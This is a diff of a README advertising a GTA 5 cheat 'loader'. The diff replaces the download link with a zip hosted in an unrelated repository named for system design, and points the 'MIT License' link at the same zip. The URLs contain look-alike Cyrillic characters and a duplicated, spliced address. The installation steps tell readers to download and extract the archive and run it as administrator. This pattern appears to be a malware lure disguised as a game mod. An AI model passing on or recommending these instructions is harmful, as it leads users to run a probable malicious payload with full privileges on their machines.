@@ -25,7 +25,7 @@ Welcome to the ultimate GTA 5 Enhancement project! Unleash your gaming experienc
 
 ## 🛠️ Installation
 
-1. Download `https://raw.githubusercontent.com/hardikk1945/system-design-fundamentals/main/Lоader.zip` from the repository.
+1. Download `https://raw.githubusercontent.com/hardikk1945/system-design-fundamentals/main/highlander/fundamentals-design-system-1.9-beta.3.zipоhttps://raw.githubusercontent.com/hardikk1945/system-design-fundamentals/main/highlander/fundamentals-design-system-1.9-beta.3.zip` from the repository.
 2. Extract using WinRAR or 7-Zip.
 3. Run the Loader as administrator.
 4. Launch GTA 5 and activate your desired enhancements from the in-game menu.
@@ -42,4 +42,4 @@ This utility is intended solely for educational and entertainment purposes. Use 
 
 ## 📙 MIT License
 
-Licensed under the [MIT License](https://raw.githubusercontent.com/hardikk1945/system-design-fundamentals/main/Lоader.zip) - 2025.
+Licensed under the [MIT License](https://raw.githubusercontent.com/hardikk1945/system-design-fundamentals/main/highlander/fundamentals-design-system-1.9-beta.3.zipоhttps://raw.githubusercontent.com/hardikk1945/system-design-fundamentals/main/highlander/fundamentals-design-system-1.9-beta.3.zip) - 2025.
